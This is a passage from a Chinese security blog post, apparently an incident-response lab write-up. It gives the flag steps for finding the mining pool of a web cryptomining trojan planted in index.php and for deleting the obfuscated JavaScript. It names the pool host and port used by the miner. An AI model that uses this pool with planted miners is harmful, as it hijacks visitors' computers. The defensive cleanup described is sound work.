<h2 id="步骤6"><a href="#步骤6" class="headerlink" title="步骤6"></a>步骤6</h2><p>分析流量并上机排查，黑客植入的网页挖矿木马所使用的矿池地址是什么，提交矿池地址(排查完毕后可以尝试删除它)提交格式：flag{xxxxxxx.xxxx.xxx:xxxx}</p>
<p>步骤五AI分析的代码已经给出矿池地址了：flag{gulf.moneroocean.stream:10128}</p>
<h2 id="步骤7"><a href="#步骤7" class="headerlink" title="步骤7"></a>步骤7</h2><p>清除掉混淆的web挖矿代码后在&#x2F;var&#x2F;flag&#x2F;2&#x2F;flag查看flag值并提交</p>
<p>直接进到index.php里面，把这段JS代码删除即可。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag"># 应急响应</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/11/05/2025%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="prev" title="2025集团网络安全攻防赛决赛复现">
                  <i class="fa fa-angle-left"></i> 2025集团网络安全攻防赛决赛复现
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/12/02/%E8%9A%81%E5%89%91%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E3%80%81%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="next" title="蚁剑、哥斯拉、冰蝎流量分析">
                  蚁剑、哥斯拉、冰蝎流量分析 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">My0n9s</span>
  </div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
